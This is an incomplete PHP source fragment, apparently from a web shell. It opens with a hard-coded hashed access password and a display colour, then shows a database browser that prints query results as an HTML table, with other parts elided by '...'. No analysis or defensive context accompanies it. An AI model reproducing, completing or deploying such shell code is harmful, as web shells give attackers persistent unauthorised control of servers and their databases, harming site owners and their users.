<?php
$auth_pass = "d50800106e7bdf16f9d021a7f7035b20";
$color = "#df5";
						...
						while($item = $db->fetch())	{
							if(!$title)	{
								...
								foreach($item as $key => $value)
									echo '<th style="width: 10px;"><input type="checkbox" name="columns[]" value="' . $key . '" /></th><th>'.$key.'</th>';
								reset($item);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							...
							foreach($item as $key => $value) {
								if($value == null)
									echo '<td colspan="2"><i>null</i></td>';
								else
									echo '<td colspan="2">'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
